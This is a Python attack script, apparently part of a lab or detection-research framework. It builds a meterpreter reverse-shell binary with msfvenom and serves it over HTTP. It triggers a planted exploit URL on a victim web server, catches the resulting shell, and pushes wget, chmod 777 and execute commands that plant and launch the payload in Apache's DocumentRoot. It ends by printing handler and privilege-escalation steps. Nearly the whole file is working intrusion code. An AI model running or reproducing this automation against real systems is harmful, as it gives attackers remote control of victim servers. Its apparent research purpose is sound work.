import requests, os, sys, time, random, threading, socket, datetime, subprocess

class color:
	PURPLE = '\033[1;35;48m'
	CYAN = '\033[1;36;48m'
	BOLD = '\033[1;37;48m'
	BLUE = '\033[1;34;48m'
	GREEN = '\033[1;32;48m'
	YELLOW = '\033[1;33;48m'
	RED = '\033[1;31;48m'
	BLACK = '\033[1;30;48m'
	UNDERLINE = '\033[4;37;48m'
	END = '\033[1;37;0m'
	

def listen(ip, port, general_info, r_port, r2_port):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.bind((ip, int(port)))
	s.listen(1)
	print(color.GREEN + "[+]" + color.END + " Listening on port " + str(port))
	conn, addr = s.accept()
	try:
		print(color.GREEN + "[+]" + color.END + ' Connection received from ',addr)
		
			    	
		# Getting the meterpreter shell to the victim	
		commands=['''cd $(grep -e DocumentRoot -R /etc/apache2/sites-enabled/ | awk '{ print $3 }')\n''',
			    '''wget -O ./shell.bin {ip}:{port}/shell.bin\n'''.format(ip=ip, port=r_port),
			    '''chmod 777 ./shell.bin\n''']
		
		for cmd in commands:
			conn.settimeout(1.0)
			ans = conn.recv(4194304).decode()
				
			conn.settimeout(None)
			conn.send(cmd.encode())
			time.sleep(0.30)
		
		# Wait for flush of threads
		time.sleep(0.3)
		print("", flush=True)
		print(color.RED + 'CTRL + C to close the script' + color.END)
		print(color.GREEN + '[*]' + color.END + color.BOLD + ' Please open a new terminal with the msfconsole so that you can use the meterpreter shell' + color.END)
		print(color.GREEN + '[*]' + color.END + color.BOLD + ' Once open, you migh execute the following commands:' + color.END)
		print(color.BOLD + '''
			use exploit/multi/handler
			set lhost {ip}
			set lport {port}
			set PAYLOAD linux/x86/meterpreter/reverse_tcp
			run
		'''.format(ip=ip, port=r2_port) + color.END)
		n = input(color.YELLOW + 'Press Enter to launch the meterpreter shell on the victim  ' + color.END)
		# Inform the Logging server
		if general_info['active'] == 'True':
			try:
				requests.get('http://'+ informAudittingStart(general_info), timeout=(1,1)) 
			except requests.exceptions.ReadTimeout:
			    		pass
			except requests.exceptions.ConnectTimeout:
			    	sys.exit(color.RED + '[-] Failed to connect to Logging server' + color.END)
	
		# Launch the meterpreter shell
		conn.send('''cd $(grep -e DocumentRoot -R /etc/apache2/sites-enabled/ | awk '{ print $3 }') && ./shell.bin &\n'''.encode())
		try:
			conn.settimeout(0.0001)
			ans = conn.recv(4194304).decode()
			conn.settimeout(None)
		except socket.timeout:
			pass
		print(color.GREEN + '''
			Once the session is created you are free to explore the meterpreter shell as you wish
			Here are some recomendations:
			
			Exit the interactive shell, executing -> background
			then
			
			use post/multi/recon/local_exploit_suggester
			set session {number_of_session_just_created} # You can check with ' sessions '
			
			# For further options use ' show options ' and make sure that all fields marked as Required have a value associated
			
			run
			
			# This will give you a list of potencial Privilege Escalation exploits to use
			 
		''' + color.END)
		while True:
			time.sleep(5)
			n = input(color.YELLOW + 'Press Enter to relaunch the shell on the victim? > ' + color.END)
			conn.send('''cd $(grep -e DocumentRoot -R /etc/apache2/sites-enabled/ | awk '{ print $3 }') && ./shell.bin &\n'''.encode())
			try:
				conn.settimeout(0.0001)
				ans = conn.recv(4194304).decode()
				conn.settimeout(None)
			except socket.timeout:
				pass
			
	except KeyboardInterrupt:
		if conn:
			print(color.YELLOW + '\n[-]' + color.END + ' Unbinding...')
			cleanup(conn, general_info)
			time.sleep(0.2)
			conn.close()
			s.close()
	conn.close()



def run(victim_info, attacker_info, general_info):
	secure = victim_info['secure'] == 'True'
	r_port = random.randint(1024, 65536)
	# Making sure the random port is not in use
	while check_port(attacker_info['ip'], r_port):
		r_port = random.randint(1024, 65536)
	
	r2_port = random.randint(1024, 65536)
	# Making sure the random port is not in use
	while check_port(attacker_info['ip'], r2_port):
		r2_port = random.randint(1024, 65536)
	s = ''
	if secure:
		s = 's'
	else:
		s = ''
	get_access = threading.Thread(target=task, args=(victim_info['ip'], victim_info['port'], s))
	download_server = threading.Thread(target=task2, args=[attacker_info, r_port, r2_port])
	download_server.start()
	print(color.GREEN + '[*]' + color.END + ' Generating the meterpreter shell')
	# Wait until the shell is created
	while not os.path.exists('/tmp/shell.bin'):
		time.sleep(0.5)
	
	print(color.GREEN + '[*] Meterpreter Shell generated' + color.END)
	get_access.start()
	listen(attacker_info['ip'], attacker_info['port'], general_info, r_port, r2_port)
	

def task(v_ip, v_port, s=''):

	time.sleep(1)
	now = datetime.datetime.now()
	print(color.GREEN + '[*]' + color.END + ' Executing Thread for HTTP Request')
	if os.path.exists('./tmp_file_with_dest_url.txt'):
		f = open('./tmp_file_with_dest_url.txt', 'r')
		url = 'http' + s + '://' + v_ip + ':' + str(v_port) + str(f.readline()).replace('\n', '')
		f.close()
		print(color.GREEN + '[*]' + color.END + ' Making request to execute reverse shell ', url, flush=True)
		# Make the timeout very low in order not to wait for response
		# Make the exception pass so that the user does not get an error 
		try:
	    		requests.get(url, timeout=(1, 1))
		except requests.exceptions.ReadTimeout:
	    		pass
		except requests.exceptions.ConnectTimeout:
	    		sys.exit(color.RED + '[-] We couldn\'t find the exploit in the victim server, check if the server is alive' + color.END)
	    		 
		os.remove('./tmp_file_with_dest_url.txt')
		print(color.GREEN + '[*]' + color.END + ' The exact time before lauching the exploit was: ', now, flush=True)
		print(color.GREEN + '[*]' + color.END + ' You can use this time to help you filter the syscall logs', flush=True)
		

	else:
		print(color.RED + '[-] URL wasn\'t generated, you might need to run the exploit another time' + color.END)
		print(color.RED + '[-] If the problem persists, please confirm the information you passed' + color.END)
		
		sys.exit()
		
		
def task2(attacker_info, port, port2):
	subprocess.Popen('msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f elf -o /tmp/shell.bin 2>/dev/null 1>/dev/null'.format(ip=attacker_info['ip'], port=port2), shell=True)
	subprocess.Popen('cd /tmp && python3 -m http.server ' + str(port) + ' 2>/dev/null 1>/dev/null', shell=True)
	
def check_port(ip, port):

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

	try:
		s.bind((ip, port))
	except socket.error as e:
		if e.errno == errno.EADDRINUSE:
			return True
		else:
			# something else raised the socket.error exception
			print(e)
			sys.exit()
	return False

	s.close()
	
def cleanup(conn, general_info):
	#conn.send(''''cd $(grep -e DocumentRoot -R /etc/apache2/sites-enabled/ | awk '{ print $3 }')  && rm shell.bin -f\n'''.encode())
	conn.send('rm $(grep -e DocumentRoot -R /etc/apache2/sites-enabled/ | awk \'{ print $3 }\')/shell.bin\n'.encode())
	os.remove('/tmp/shell.bin')
	if general_info['active'] == 'True':
		try:
			requests.get('http://'+ informAudittingStop(general_info), timeout=(1,1)) 
		except requests.exceptions.ReadTimeout:
			pass
		except requests.exceptions.ConnectTimeout:
			sys.exit(color.RED + '[-] Failed to connect to Logging server' + color.END)
			
def informAudittingStart(general_info):
	exploit = 'Meterpreter'
	url = general_info['host'] + ':' + general_info['port'] + '/start?exploit=' + exploit 
	return url

def informAudittingStop(general_info):
	exploit = 'Meterpreter'
	url = general_info['host'] + ':' + general_info['port'] + '/stop?exploit=' + exploit 
	return url

